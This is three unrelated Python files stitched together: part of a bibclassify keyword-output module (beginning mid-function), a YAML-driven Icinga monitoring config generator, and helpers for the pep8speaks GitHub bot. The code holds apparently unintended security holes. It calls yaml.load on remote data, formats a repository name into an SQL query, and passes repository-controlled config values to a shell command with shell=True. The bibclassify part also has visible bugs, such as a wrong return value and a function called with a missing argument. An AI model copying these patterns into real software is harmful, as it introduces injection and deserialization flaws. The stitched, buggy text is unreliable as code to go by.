    composite_keywords_p = _sort_kw_matches(composite_keywords)

    for w in single_keywords_p:
        categories[w[0].concept] = w[0].type
    for w in single_keywords_p:
        categories[w[0].concept] = w[0].type

    complete_output = _output_complete(single_keywords_p, composite_keywords_p,
                                       author_keywords, acronyms, spires,
                                       only_core_tags, limit=output_limit)
    functions = {"text": _output_text, "marcxml": _output_marc, "html":
                 _output_html, "dict": _output_dict}
    my_styles = {}

    for s in style:
        if s != "raw":
            my_styles[s] = functions[s](complete_output, categories)
        else:
            if output_limit > 0:
                my_styles["raw"] = (_kw(_sort_kw_matches(single_keywords, output_limit)),
                                    _kw(_sort_kw_matches(composite_keywords, output_limit)),
                                    author_keywords,  # this we don't limit (?)
                                    _kw(_sort_kw_matches(acronyms, output_limit)))
            else:
                my_styles["raw"] = (single_keywords_p, composite_keywords_p, author_keywords, acronyms)

    return my_styles


def build_marc(recid, single_keywords, composite_keywords,
               spires=False, author_keywords=None, acronyms=None):
    """Create xml record.

    :var recid: ingeter
    :var single_keywords: dictionary of kws
    :var composite_keywords: dictionary of kws
    :keyword spires: please don't use, left for historical
        reasons
    :keyword author_keywords: dictionary of extracted keywords
    :keyword acronyms: dictionary of extracted acronyms
    :return: str, marxml
    """
    output = ['<collection><record>\n'
              '<controlfield tag="001">%s</controlfield>' % recid]

    # no need to sort
    single_keywords = single_keywords.items()
    composite_keywords = composite_keywords.items()

    output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms))

    output.append('</record></collection>')

    return '\n'.join(output)


def _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD,
                 auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD,
                 provenience='BibClassify'):
    """Output the keywords in the MARCXML format.

    :var skw_matches: list of single keywords
    :var ckw_matches: list of composite keywords
    :var author_keywords: dictionary of extracted author keywords
    :var acronyms: dictionary of acronyms
    :var spires: boolean, True=generate spires output - BUT NOTE: it is
            here only not to break compatibility, in fact spires output
            should never be used for xml because if we read marc back
            into the KeywordToken objects, we would not find them
    :keyword provenience: string that identifies source (authority) that
        assigned the contents of the field
    :return: string, formatted MARC"""

    kw_template = ('<datafield tag="%s" ind1="%s" ind2="%s">\n'
                   '    <subfield code="2">%s</subfield>\n'
                   '    <subfield code="a">%s</subfield>\n'
                   '    <subfield code="n">%s</subfield>\n'
                   '    <subfield code="9">%s</subfield>\n'
                   '</datafield>\n')

    output = []

    tag, ind1, ind2 = _parse_marc_code(kw_field)
    for keywords in (output_complete["Single keywords"], output_complete["Core keywords"]):
        for kw in keywords:
            output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),
                                         encode_for_xml(kw), keywords[kw],
                                         encode_for_xml(categories[kw])))

    for field, keywords in ((auth_field, output_complete["Author keywords"]),
                            (acro_field, output_complete["Acronyms"])):
        if keywords and len(keywords) and field:  # field='' we shall not save the keywords
            tag, ind1, ind2 = _parse_marc_code(field)
            for kw, info in keywords.items():
                output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),
                                             encode_for_xml(kw), '', encode_for_xml(categories[kw])))

    return "".join(output)


def _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None,
                     acronyms=None, spires=False, only_core_tags=False,
                     limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER):

    if limit:
        resized_skw = skw_matches[0:limit]
        resized_ckw = ckw_matches[0:limit]
    else:
        resized_skw = skw_matches
        resized_ckw = ckw_matches

    results = {"Core keywords": _get_core_keywords(skw_matches, ckw_matches, spires=spires)}

    if not only_core_tags:
        results["Author keywords"] = _get_author_keywords(author_keywords, spires=spires)
        results["Composite keywords"] = _get_compositekws(resized_ckw, spires=spires)
        results["Single keywords"] = _get_singlekws(resized_skw, spires=spires)
        results["Field codes"] = _get_fieldcodes(resized_skw, resized_ckw, spires=spires)
        results["Acronyms"] = _get_acronyms(acronyms)

    return results


def _output_dict(complete_output, categories):
    return {
        "complete_output": complete_output,
        "categories": categories
    }


def _output_text(complete_output, categories):
    """Output the results obtained in text format.


    :return: str, html formatted output
    """
    output = ""

    for result in complete_output:
        list_result = complete_output[result]
        if list_result:
            list_result_sorted = sorted(list_result, key=lambda x: list_result[x],
                                        reverse=True)
            output += "\n\n{0}:\n".format(result)
            for element in list_result_sorted:
                output += "\n{0} {1}".format(list_result[element], element)

    output += "\n--\n{0}".format(_signature())

    return output


def _output_html(complete_output, categories):
    """Output the same as txt output does, but HTML formatted.

    :var skw_matches: sorted list of single keywords
    :var ckw_matches: sorted list of composite keywords
    :var author_keywords: dictionary of extracted author keywords
    :var acronyms: dictionary of acronyms
    :var spires: boolean
    :var only_core_tags: boolean
    :keyword limit: int, number of printed keywords
    :return: str, html formatted output
    """
    return """<html>
    <head>
      <title>Automatically generated keywords by bibclassify</title>
    </head>
    <body>
    {0}
    </body>
    </html>""".format(
        _output_text(complete_output).replace('\n', '<br>')
    ).replace('\n', '')


def _get_singlekws(skw_matches, spires=False):
    """
    :var skw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: list of formatted keywords
    """
    output = {}
    for single_keyword, info in skw_matches:
        output[single_keyword.output(spires)] = len(info[0])
    return output


def _get_compositekws(ckw_matches, spires=False):
    """
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: list of formatted keywords
    """
    output = {}
    for composite_keyword, info in ckw_matches:
        output[composite_keyword.output(spires)] = {"numbers": len(info[0]),
                                                    "details": info[1]}
    return output


def _get_acronyms(acronyms):
    """Return a formatted list of acronyms."""
    acronyms_str = {}
    if acronyms:
        for acronym, expansions in iteritems(acronyms):
            expansions_str = ", ".join(["%s (%d)" % expansion
                                        for expansion in expansions])
            acronyms_str[acronym] = expansions_str

    return acronyms


def _get_author_keywords(author_keywords, spires=False):
    """Format the output for the author keywords.

    :return: list of formatted author keywors
    """
    out = {}
    if author_keywords:
        for keyword, matches in author_keywords.items():
            skw_matches = matches[0]  # dictionary of single keywords
            ckw_matches = matches[1]  # dict of composite keywords
            matches_str = []
            for ckw, spans in ckw_matches.items():
                matches_str.append(ckw.output(spires))
            for skw, spans in skw_matches.items():
                matches_str.append(skw.output(spires))
            if matches_str:
                out[keyword] = matches_str
            else:
                out[keyword] = 0

    return out


def _get_fieldcodes(skw_matches, ckw_matches, spires=False):
    """Return the output for the field codes.

    :var skw_matches: dict of {keyword: [info,...]}
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: string"""
    fieldcodes = {}
    output = {}

    for skw, _ in skw_matches:
        for fieldcode in skw.fieldcodes:
            fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires))
    for ckw, _ in ckw_matches:

        if len(ckw.fieldcodes):
            for fieldcode in ckw.fieldcodes:
                fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires))
        else:  # inherit field-codes from the composites
            for kw in ckw.getComponents():
                for fieldcode in kw.fieldcodes:
                    fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires))
                    fieldcodes.setdefault('*', set()).add(kw.output(spires))

    for fieldcode, keywords in fieldcodes.items():
        output[fieldcode] = ', '.join(keywords)

    return output


def _get_core_keywords(skw_matches, ckw_matches, spires=False):
    """Return the output for the field codes.

    :var skw_matches: dict of {keyword: [info,...]}
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: set of formatted core keywords
    """
    output = {}
    category = {}

    def _get_value_kw(kw):
        """Help to sort the Core keywords."""
        i = 0
        while kw[i].isdigit():
            i += 1
        if i > 0:
            return int(kw[:i])
        else:
            return 0

    for skw, info in skw_matches:
        if skw.core:
            output[skw.output(spires)] = len(info[0])
            category[skw.output(spires)] = skw.type
    for ckw, info in ckw_matches:
        if ckw.core:
            output[ckw.output(spires)] = len(info[0])
        else:
            #test if one of the components is  not core
            i = 0
            for c in ckw.getComponents():
                if c.core:
                    output[c.output(spires)] = info[1][i]
                i += 1
    return output


def _filter_core_keywors(keywords):
    matches = {}
    for kw, info in keywords.items():
        if kw.core:
            matches[kw] = info
    return matches


def _signature():
    """Print out the bibclassify signature.

    #todo: add information about taxonomy, rdflib"""

    return 'bibclassify v%s' % (bconfig.VERSION,)


def clean_before_output(kw_matches):
    """Return a clean copy of the keywords data structure.

    Stripped off the standalone and other unwanted elements"""
    filtered_kw_matches = {}

    for kw_match, info in iteritems(kw_matches):
        if not kw_match.nostandalone:
            filtered_kw_matches[kw_match] = info

    return filtered_kw_matches

# ---------------------------------------------------------------------
#                          helper functions
# ---------------------------------------------------------------------


def _skw_matches_comparator(kw0, kw1):
    """
    Compare 2 single keywords objects.

    First by the number of their spans (ie. how many times they were found),
    if it is equal it compares them by lenghts of their labels.
    """
    list_comparison = cmp(len(kw1[1][0]), len(kw0[1][0]))
    if list_comparison:
        return list_comparison

    if kw0[0].isComposite() and kw1[0].isComposite():
        component_avg0 = sum(kw0[1][1]) / len(kw0[1][1])
        component_avg1 = sum(kw1[1][1]) / len(kw1[1][1])
        component_comparison = cmp(component_avg1, component_avg0)
        if component_comparison:
            return component_comparison

    return cmp(len(str(kw1[0])), len(str(kw0[0])))


def _kw(keywords):
    """Turn list of keywords into dictionary."""
    r = {}
    for k, v in keywords:
        r[k] = v
    return r


def _sort_kw_matches(skw_matches, limit=0):
    """Return a resized version of keywords to the given length."""
    sorted_keywords = list(skw_matches.items())
    sorted_keywords.sort(_skw_matches_comparator)
    return limit and sorted_keywords[:limit] or sorted_keywords


def _get_partial_text(fulltext):
    """
    Return a short version of the fulltext used with the partial matching mode.

    The version is composed of 20% in the beginning and 20% in the middle of the
    text."""
    length = len(fulltext)

    get_index = lambda x: int(float(x) / 100 * length)

    partial_text = [fulltext[get_index(start):get_index(end)]
                    for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT]

    return "\n".join(partial_text)


def save_keywords(filename, xml):
    tmp_dir = os.path.dirname(filename)
    if not os.path.isdir(tmp_dir):
        os.mkdir(tmp_dir)

    file_desc = open(filename, "w")
    file_desc.write(xml)
    file_desc.close()


def get_tmp_file(recid):
    tmp_directory = "%s/bibclassify" % bconfig.CFG_TMPDIR
    if not os.path.isdir(tmp_directory):
        os.mkdir(tmp_directory)
    filename = "bibclassify_%s.xml" % recid
    abs_path = os.path.join(tmp_directory, filename)
    return abs_path


def _parse_marc_code(field):
    """Parse marc field and return default indicators if not filled in."""
    field = str(field)
    if len(field) < 4:
        raise Exception('Wrong field code: %s' % field)
    else:
        field += '__'
    tag = field[0:3]
    ind1 = field[3].replace('_', '')
    ind2 = field[4].replace('_', '')
    return tag, ind1, ind2


if __name__ == "__main__":
    log.error("Please use bibclassify_cli from now on.")


import datetime
import os
import os.path
import urlparse
import socket
from time import localtime, strftime, time

from requests.exceptions import RequestException, ConnectionError, Timeout
import requests
import yaml

from monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, HostUnreachableException
from monitoring_config_generator.yaml_tools.merger import merge_yaml_files

def is_file(parsed_uri):
    return parsed_uri.scheme in ['', 'file']


def is_host(parsed_uri):
    return parsed_uri.scheme in ['http', 'https']


def read_config(uri):
    uri_parsed = urlparse.urlparse(uri)
    if is_file(uri_parsed):
        return read_config_from_file(uri_parsed.path)
    elif is_host(uri_parsed):
        return read_config_from_host(uri)
    else:
        raise ValueError('Given url was not acceptable %s' % uri)


def read_config_from_file(path):
    yaml_config = merge_yaml_files(path)
    etag = None
    mtime = os.path.getmtime(path)
    return yaml_config, Header(etag=etag, mtime=mtime)


def read_config_from_host(url):
    try:
        response = requests.get(url)
    except socket.error as e:
        msg = "Could not open socket for '%s', error: %s" % (url, e)
        raise HostUnreachableException(msg)
    except ConnectionError as e:
        msg = "Could not establish connection for '%s', error: %s" % (url, e)
        raise HostUnreachableException(msg)
    except Timeout as e:
        msg = "Connect timed out for '%s', error: %s" % (url, e)
        raise HostUnreachableException(msg)
    except RequestException as e:
        msg = "Could not get monitoring yaml from '%s', error: %s" % (url, e)
        raise MonitoringConfigGeneratorException(msg)

    def get_from_header(field):
        return response.headers[field] if field in response.headers else None

    if response.status_code == 200:
        yaml_config = yaml.load(response.content)                    
        etag = get_from_header('etag')
        mtime = get_from_header('last-modified')
        mtime = datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time())
    else:
        msg = "Request %s returned with status %s. I don't know how to handle that." % (url, response.status_code)
        raise MonitoringConfigGeneratorException(msg)

    return yaml_config, Header(etag=etag, mtime=mtime)


class Header(object):
    MON_CONF_GEN_COMMENT = '# Created by MonitoringConfigGenerator'
    ETAG_COMMENT = '# ETag: '
    MTIME_COMMMENT = '# MTime: '

    def __init__(self, etag=None, mtime=0):
        self.etag = etag
        self.mtime = int(mtime)

    def __nonzero__(self):
        return self.etag is None and self.mtime is 0

    def __eq__(self, other):
        return self.etag == other.etag and self.mtime == other.mtime

    def __repr__(self):
        return "Header(%s, %d)" % (self.etag, self.mtime)

    def is_newer_than(self, other):
        if self.etag != other.etag or self.etag is None:
            return cmp(self.mtime, other.mtime) > 0
        else:
            return False

    def serialize(self):
        lines = []
        time_string = strftime("%Y-%m-%d %H:%M:%S", localtime())
        lines.append("%s on %s" % (Header.MON_CONF_GEN_COMMENT, time_string))
        if self.etag:
            lines.append("%s%s" % (Header.ETAG_COMMENT, self.etag))
        if self.mtime:
            lines.append("%s%d" % (Header.MTIME_COMMMENT, self.mtime))
        return lines

    @staticmethod
    def parse(file_name):
        etag, mtime = None, 0

        def extract(comment, current_value):
            value = None
            if line.startswith(comment):
                value = line.rstrip()[len(comment):]
            return value or current_value

        try:
            with open(file_name, 'r') as config_file:
                for line in config_file.xreadlines():
                    etag = extract(Header.ETAG_COMMENT, etag)
                    mtime = extract(Header.MTIME_COMMMENT, mtime)
                    if etag and mtime:
                        break
        except IOError as e:
            # it is totally fine to not have an etag, in that case there
            # will just be no caching and the server will have to deliver the data again
            pass
        finally:
            return Header(etag=etag, mtime=mtime)

"""monconfgenerator

Creates an Icinga monitoring configuration. It does it by querying an URL from
which it receives a specially formatted yaml file. This file is transformed into
a valid Icinga configuration file.
If no URL is given it reads it's default configuration from file system. The
configuration file is: /etc/monitoring_config_generator/config.yaml'

Usage:
  monconfgenerator [--debug] [--targetdir=<directory>] [--skip-checks] [URL]
  monconfgenerator -h

Options:
  -h                Show this message.
  --debug           Print additional information.
  --targetdir=DIR   The generated Icinga monitoring configuration is written
                    into this directory. If no target directory is given its
                    value is read from /etc/monitoring_config_generator/config.yaml
  --skip-checks     Do not run checks on the yaml file received from the URL.

"""
from datetime import datetime
import logging
import os
import sys

from docopt import docopt

from monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, \
    ConfigurationContainsUndefinedVariables, NoSuchHostname, HostUnreachableException
from monitoring_config_generator import set_log_level_to_debug
from monitoring_config_generator.yaml_tools.readers import Header, read_config
from monitoring_config_generator.yaml_tools.config import YamlConfig
from monitoring_config_generator.settings import CONFIG


EXIT_CODE_CONFIG_WRITTEN = 0
EXIT_CODE_ERROR = 1
EXIT_CODE_NOT_WRITTEN = 2

LOG = logging.getLogger("monconfgenerator")


class MonitoringConfigGenerator(object):
    def __init__(self, url, debug_enabled=False, target_dir=None, skip_checks=False):
        self.skip_checks = skip_checks
        self.target_dir = target_dir if target_dir else CONFIG['TARGET_DIR']
        self.source = url

        if debug_enabled:
            set_log_level_to_debug()

        if not self.target_dir or not os.path.isdir(self.target_dir):
            raise MonitoringConfigGeneratorException("%s is not a directory" % self.target_dir)

        LOG.debug("Using %s as target dir" % self.target_dir)
        LOG.debug("Using URL: %s" % self.source)
        LOG.debug("MonitoringConfigGenerator start: reading from %s, writing to %s" %
                  (self.source, self.target_dir))

    def _is_newer(self, header_source, hostname):
        if not hostname:
            raise NoSuchHostname('hostname not found')
        output_path = self.output_path(self.create_filename(hostname))
        old_header = Header.parse(output_path)
        return header_source.is_newer_than(old_header)

    def output_path(self, file_name):
        return os.path.join(self.target_dir, file_name)

    def write_output(self, file_name, yaml_icinga):
        lines = yaml_icinga.icinga_lines
        output_writer = OutputWriter(self.output_path(file_name))
        output_writer.write_lines(lines)

    @staticmethod
    def create_filename(hostname):
        name = '%s.cfg' % hostname
        if name != os.path.basename(name):
            msg = "Directory traversal attempt detected for host name %r"
            raise Exception(msg % hostname)
        return name

    def generate(self):
        file_name = None
        raw_yaml_config, header_source = read_config(self.source)

        if raw_yaml_config is None:
            raise SystemExit("Raw yaml config from source '%s' is 'None'." % self.source)

        yaml_config = YamlConfig(raw_yaml_config,
                                 skip_checks=self.skip_checks)

        if yaml_config.host and self._is_newer(header_source, yaml_config.host_name):
            file_name = self.create_filename(yaml_config.host_name)
            yaml_icinga = YamlToIcinga(yaml_config, header_source)
            self.write_output(file_name, yaml_icinga)

        if file_name:
            LOG.info("Icinga config file '%s' created." % file_name)

        return file_name

class YamlToIcinga(object):
    def __init__(self, yaml_config, header):
        self.icinga_lines = []
        self.indent = CONFIG['INDENT']
        self.icinga_lines.extend(header.serialize())
        self.write_section('host', yaml_config.host)
        for service in yaml_config.services:
            self.write_section('service', service)

    def write_line(self, line):
        self.icinga_lines.append(line)

    def write_section(self, section_name, section_data):
        self.write_line("")
        self.write_line("define %s {" % section_name)
        sorted_keys = section_data.keys()
        sorted_keys.sort()
        for key in sorted_keys:
            value = section_data[key]                    
            self.icinga_lines.append(("%s%-45s%s" % (self.indent, key, self.value_to_icinga(value))))                    
        self.write_line("}")

    @staticmethod
    def value_to_icinga(value):
        """Convert a scalar or list to Icinga value format. Lists are concatenated by ,
        and empty (None) values produce an empty string"""
        if isinstance(value, list):
            # explicitly set None values to empty string
            return ",".join([str(x) if (x is not None) else "" for x in value])
        else:
            return str(value)


class OutputWriter(object):
    def __init__(self, output_file):
        self.output_file = output_file

    def write_lines(self, lines):
        with open(self.output_file, 'w') as f:
            for line in lines:
                f.write(line + "\n")
        LOG.debug("Created %s" % self.output_file)


def generate_config():
    arg = docopt(__doc__, version='0.1.0')
    start_time = datetime.now()
    try:
        file_name = MonitoringConfigGenerator(arg['URL'],
                                              arg['--debug'],
                                              arg['--targetdir'],
                                              arg['--skip-checks']).generate()
        exit_code = EXIT_CODE_CONFIG_WRITTEN if file_name else EXIT_CODE_NOT_WRITTEN
    except HostUnreachableException:
        LOG.warn("Target url {0} unreachable. Could not get yaml config!".format(arg['URL']))
        exit_code = EXIT_CODE_NOT_WRITTEN
    except ConfigurationContainsUndefinedVariables:
        LOG.error("Configuration contained undefined variables!")
        exit_code = EXIT_CODE_ERROR
    except SystemExit as e:
        exit_code = e.code
    except BaseException as e:
        LOG.error(e)
        exit_code = EXIT_CODE_ERROR
    finally:
        stop_time = datetime.now()
        LOG.info("finished in %s" % (stop_time - start_time))
    sys.exit(exit_code)


if __name__ == '__main__':
    generate_config()

# -*- coding: utf-8 -*-

import base64
import collections
import datetime
import hmac
import json
import os
import re
import subprocess
import time

import psycopg2
import requests
import unidiff
import yaml
from flask import abort


def update_users(repository):
    """Update users of the integration in the database"""
    if os.environ.get("OVER_HEROKU", False) is not False:
        # Check if repository exists in database
        query = r"INSERT INTO Users (repository, created_at) VALUES ('{}', now());" \
                "".format(repository)

        try:
            cursor.execute(query)
            conn.commit()
        except psycopg2.IntegrityError:  # If already exists
            conn.rollback()


def follow_user(user):
    """Follow the user of the service"""
    headers = {
        "Authorization": "token " + os.environ["GITHUB_TOKEN"],
        "Content-Length": "0",
    }
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    url = "https://api.github.com/user/following/{}"
    url = url.format(user)
    r = requests.put(url, headers=headers, auth=auth)


def update_dict(base, head):
    """
    Recursively merge or update dict-like objects.
    >>> update({'k1': 1}, {'k1': {'k2': {'k3': 3}}})

    Source : http://stackoverflow.com/a/32357112/4698026
    """
    for key, value in head.items():
        if isinstance(base, collections.Mapping):                    
            if isinstance(value, collections.Mapping):                    
                base[key] = update_dict(base.get(key, {}), value)                    
            else:                    
                base[key] = head[key]                    
        else:                    
            base = {key: head[key]}                    
    return base


def match_webhook_secret(request):
    """Match the webhook secret sent from GitHub"""
    if os.environ.get("OVER_HEROKU", False) is not False:
        header_signature = request.headers.get('X-Hub-Signature')
        if header_signature is None:
            abort(403)
        sha_name, signature = header_signature.split('=')
        if sha_name != 'sha1':
            abort(501)
        mac = hmac.new(os.environ["GITHUB_PAYLOAD_SECRET"].encode(), msg=request.data,
                       digestmod="sha1")
        if not hmac.compare_digest(str(mac.hexdigest()), str(signature)):
            abort(403)
    return True


def check_pythonic_pr(data):
    """
    Return True if the PR contains at least one Python file
    """
    files = list(get_files_involved_in_pr(data).keys())
    pythonic = False
    for file in files:
        if file[-3:] == '.py':
            pythonic = True
            break

    return pythonic


def get_config(data):
    """
    Get .pep8speaks.yml config file from the repository and return
    the config dictionary
    """

    # Default configuration parameters
    config = {
        "message": {
            "opened": {
                "header": "",
                "footer": ""
            },
            "updated": {
                "header": "",
                "footer": ""
            }
        },
        "scanner": {"diff_only": False},
        "pycodestyle": {
            "ignore": [],
            "max-line-length": 79,
            "count": False,
            "first": False,
            "show-pep8": False,
            "filename": [],
            "exclude": [],
            "select": [],
            "show-source": False,
            "statistics": False,
            "hang-closing": False,
        },
        "no_blank_comment": True,
        "only_mention_files_with_errors": True,
    }

    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])

    # Configuration file
    url = "https://raw.githubusercontent.com/{}/{}/.pep8speaks.yml"

    url = url.format(data["repository"], data["after_commit_hash"])
    r = requests.get(url, headers=headers, auth=auth)
    if r.status_code == 200:
        try:
            new_config = yaml.load(r.text)
            # overloading the default configuration with the one specified
            config = update_dict(config, new_config)
        except yaml.YAMLError:  # Bad YAML file
            pass

    # Create pycodestyle command line arguments
    arguments = []
    confs = config["pycodestyle"]
    for key, value in confs.items():
        if value:  # Non empty
            if isinstance(value, int):
                if isinstance(value, bool):
                    arguments.append("--{}".format(key))
                else:                    
                    arguments.append("--{}={}".format(key, value))
            elif isinstance(value, list):
                arguments.append("--{}={}".format(key, ','.join(value)))
    config["pycodestyle_cmd_config"] = ' {arguments}'.format(arguments=' '.join(arguments))

    # pycodestyle is case-sensitive
    config["pycodestyle"]["ignore"] = [e.upper() for e in list(config["pycodestyle"]["ignore"])]

    return config


def get_files_involved_in_pr(data):
    """
    Return a list of file names modified/added in the PR
    """
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    diff_headers = headers.copy()
    diff_headers["Accept"] = "application/vnd.github.VERSION.diff"
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    repository = data["repository"]
    after_commit_hash = data["after_commit_hash"]
    author = data["author"]
    diff_url = "https://api.github.com/repos/{}/pulls/{}"
    diff_url = diff_url.format(repository, str(data["pr_number"]))
    r = requests.get(diff_url, headers=diff_headers, auth=auth)
    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    files = {}

    for patchset in patch:
        file = patchset.target_file[1:]
        files[file] = []
        for hunk in patchset:
            for line in hunk.target_lines():
                if line.is_added:
                    files[file].append(line.target_line_no)

    return files


def get_python_files_involved_in_pr(data):
    files = get_files_involved_in_pr(data)
    for file in list(files.keys()):
        if file[-3:] != ".py":
            del files[file]

    return files


def run_pycodestyle(data, config):
    """
    Run pycodestyle script on the files and update the data
    dictionary
    """
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    repository = data["repository"]
    after_commit_hash = data["after_commit_hash"]
    author = data["author"]

    # Run pycodestyle
    ## All the python files with additions
    # A dictionary with filename paired with list of new line numbers
    py_files = get_python_files_involved_in_pr(data)

    for file in py_files:
        filename = file[1:]
        url = "https://raw.githubusercontent.com/{}/{}/{}"
        url = url.format(repository, after_commit_hash, file)
        r = requests.get(url, headers=headers, auth=auth)
        with open("file_to_check.py", 'w+', encoding=r.encoding) as file_to_check:
            file_to_check.write(r.text)

        # Use the command line here
        cmd = 'pycodestyle {config[pycodestyle_cmd_config]} file_to_check.py'.format(
            config=config)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data["extra_results"][filename] = stdout.decode(r.encoding).splitlines()

        # Put only relevant errors in the data["results"] dictionary
        data["results"][filename] = []
        for error in list(data["extra_results"][filename]):
            if re.search("^file_to_check.py:\d+:\d+:\s[WE]\d+\s.*", error):
                data["results"][filename].append(error.replace("file_to_check.py", filename))
                data["extra_results"][filename].remove(error)

        ## Remove errors in case of diff_only = True
        ## which are caused in the whole file
        for error in list(data["results"][filename]):
            if config["scanner"]["diff_only"]:
                if not int(error.split(":")[1]) in py_files[file]:
                    data["results"][filename].remove(error)

        ## Store the link to the file
        url = "https://github.com/{}/blob/{}{}"
        data[filename + "_link"] = url.format(repository, after_commit_hash, file)
        os.remove("file_to_check.py")


def prepare_comment(request, data, config):
    """Construct the string of comment i.e. its header, body and footer"""
    author = data["author"]
    # Write the comment body
    ## Header
    comment_header = ""
    if request.json["action"] == "opened":
        if config["message"]["opened"]["header"] == "":
            comment_header = "Hello @" + author + "! Thanks for submitting the PR.\n\n"
        else:                    
            comment_header = config["message"]["opened"]["header"] + "\n\n"
    elif request.json["action"] in ["synchronize", "reopened"]:
        if config["message"]["updated"]["header"] == "":
            comment_header = "Hello @" + author + "! Thanks for updating the PR.\n\n"
        else:                    
            comment_header = config["message"]["updated"]["header"] + "\n\n"

    ## Body
    ERROR = False  # Set to True when any pep8 error exists
    comment_body = []
    for file, issues in data["results"].items():
        if len(issues) == 0:
            if not config["only_mention_files_with_errors"]:
                comment_body.append(
                    " - There are no PEP8 issues in the"
                    " file [`{0}`]({1}) !".format(file, data[file + "_link"]))
        else:                    
            ERROR = True
            comment_body.append(
                " - In the file [`{0}`]({1}), following "
                "are the PEP8 issues :\n".format(file, data[file + "_link"]))
            for issue in issues:
                ## Replace filename with L
                error_string = issue.replace(file + ":", "Line ")

                ## Link error codes to search query
                error_string_list = error_string.split(" ")
                code = error_string_list[2]
                code_url = "https://duckduckgo.com/?q=pep8%20{0}".format(code)
                error_string_list[2] = "[{0}]({1})".format(code, code_url)

                ## Link line numbers in the file
                line, col = error_string_list[1][:-1].split(":")
                line_url = data[file + "_link"] + "#L" + line
                error_string_list[1] = "[{0}:{1}]({2}):".format(line, col, line_url)
                error_string = " ".join(error_string_list)
                error_string = error_string.replace("Line [", "[Line ")
                comment_body.append("\n> {0}".format(error_string))

        comment_body.append("\n\n")
        if len(data["extra_results"][file]) > 0:
            comment_body.append(" - Complete extra results for this file :\n\n")
            comment_body.append("> " + "".join(data["extra_results"][file]))
            comment_body.append("---\n\n")

    if config["only_mention_files_with_errors"] and not ERROR:
        comment_body.append("Cheers ! There are no PEP8 issues in this Pull Request. :beers: ")


    comment_body = ''.join(comment_body)


    ## Footer
    comment_footer = []
    if request.json["action"] == "opened":
        comment_footer.append(config["message"]["opened"]["footer"])
    elif request.json["action"] in ["synchronize", "reopened"]:
        comment_footer.append(config["message"]["updated"]["footer"])

    comment_footer = ''.join(comment_footer)

    return comment_header, comment_body, comment_footer, ERROR


def comment_permission_check(data, comment):
    """Check for quite and resume status or duplicate comments"""
    PERMITTED_TO_COMMENT = True
    repository = data["repository"]
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])

    # Check for duplicate comment
    url = "https://api.github.com/repos/{}/issues/{}/comments"
    url = url.format(repository, str(data["pr_number"]))
    comments = requests.get(url, headers=headers, auth=auth).json()

    # Get the last comment by the bot
    last_comment = ""
    for old_comment in reversed(comments):
        if old_comment["user"]["id"] == 24736507:  # ID of @pep8speaks
            last_comment = old_comment["body"]
            break

    """
    # Disabling this because only a single comment is made per PR
    text1 = ''.join(BeautifulSoup(markdown(comment)).findAll(text=True))
    text2 = ''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True))
    if text1 == text2.replace("submitting", "updating"):
        PERMITTED_TO_COMMENT = False
    """

    # Check if the bot is asked to keep quiet
    for old_comment in reversed(comments):
        if '@pep8speaks' in old_comment['body']:
            if 'resume' in old_comment['body'].lower():
                break
            elif 'quiet' in old_comment['body'].lower():
                PERMITTED_TO_COMMENT = False


    return PERMITTED_TO_COMMENT


def create_or_update_comment(data, comment):
    comment_mode = None
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])

    query = "https://api.github.com/repos/{}/issues/{}/comments"
    query = query.format(data["repository"], str(data["pr_number"]))
    comments = requests.get(query, headers=headers, auth=auth).json()

    # Get the last comment id by the bot
    last_comment_id = None
    for old_comment in comments:
        if old_comment["user"]["id"] == 24736507:  # ID of @pep8speaks
            last_comment_id = old_comment["id"]
            break

    if last_comment_id is None:  # Create a new comment
        response = requests.post(query, json={"body": comment}, headers=headers, auth=auth)
        data["comment_response"] = response.json()
    else:  # Update the last comment                    
        utc_time = datetime.datetime.utcnow()
        time_now = utc_time.strftime("%B %d, %Y at %H:%M Hours UTC")
        comment += "\n\n##### Comment last updated on {}"
        comment = comment.format(time_now)

        query = "https://api.github.com/repos/{}/issues/comments/{}"
        query = query.format(data["repository"], str(last_comment_id))
        response = requests.patch(query, json={"body": comment}, headers=headers, auth=auth)


def autopep8(data, config):
    # Run pycodestyle

    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    r = requests.get(data["diff_url"], headers=headers, auth=auth)
    ## All the python files with additions
